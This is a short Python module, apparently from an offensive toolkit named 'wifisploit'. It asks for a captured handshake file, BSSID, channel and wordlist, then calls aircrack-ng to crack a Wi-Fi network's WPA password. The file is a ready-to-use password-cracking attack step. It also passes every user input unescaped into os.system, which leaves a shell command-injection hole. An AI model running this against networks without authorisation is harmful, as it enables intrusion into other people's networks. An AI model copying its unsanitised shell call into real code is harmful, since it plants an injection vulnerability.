# wifisploit/modules/crack_handshake.py

import os
from pystyle import Colorate, Colors
from colorama import init
init(autoreset=True)

gradient_colors = Colors.red_to_white

handshake = input(Colorate.Horizontal(gradient_colors, "wsf (Handshake) > "))
if handshake.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Handshake => {handshake}"))

bssid = input(Colorate.Horizontal(gradient_colors, "wsf (BSSID) > "))
if bssid.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"BSSID => {bssid}"))

channel = input(Colorate.Horizontal(gradient_colors, "wsf (Channel) > "))
if channel.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Channel => {channel}"))

wordlist = input(Colorate.Horizontal(gradient_colors, "wsf Wwordlist) > "))
if wordlist.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Wordlist => {wordlist}"))

os.system(f"aircrack-ng -b {bssid} -c {channel} -w {wordlist} {handshake}")